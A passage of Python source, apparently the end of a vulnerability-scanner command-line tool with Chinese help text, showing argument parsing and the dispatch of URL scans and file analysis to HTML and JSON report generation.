    parser = argparse.ArgumentParser(description='Hack Scanner - 自动化漏洞扫描器')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='要扫描的URL地址')
    group.add_argument('-f', '--file', help='要分析的文件/文件目录')
    parser.add_argument('-o', '--output', default=os.path.join(os.getcwd(), 'report'), help='输出目录 (默认: ./report)')
    parser.add_argument('--json-only', action='store_true', help='只生成JSON报告')

    args = parser.parse_args()

    print_banner()

    if args.url:
        if not args.url.startswith(('http://', 'https://')):
            args.url = 'https://' + args.url
        os.makedirs(args.output, exist_ok=True)
        scan_url(args.url, os.path.join(args.output, 'report.html'))

    elif args.file:
        print(f"\n{'='*60}")
        print(f"📁 分析文件/目录: {args.file}")
        print('='*60)
        import file_analyzer
        results = file_analyzer.analyze_file_or_dir(args.file)
        if results:
            report_path = os.path.join(args.output, 'report.html')
            json_path = os.path.join(args.output, 'report.json')
            ReportGenerator.generate_json(results[0] if hasattr(results[0], '__dict__') else ScanResult(target_url=args.file, hostname='N/A', findings=results), json_path)
            # 对文件分析，也生成HTML
            fake_result = ScanResult(target_url=args.file, hostname='N/A', findings=results if results else [])
            html_out = os.path.join(args.output, 'file_report.html')
            ReportGenerator.generate(fake_result, html_out)
            print(f"\n📄 报告已保存:")
            print(f"  {html_out}")
            print(f"  {json_path}")


if __name__ == '__main__':
    main()
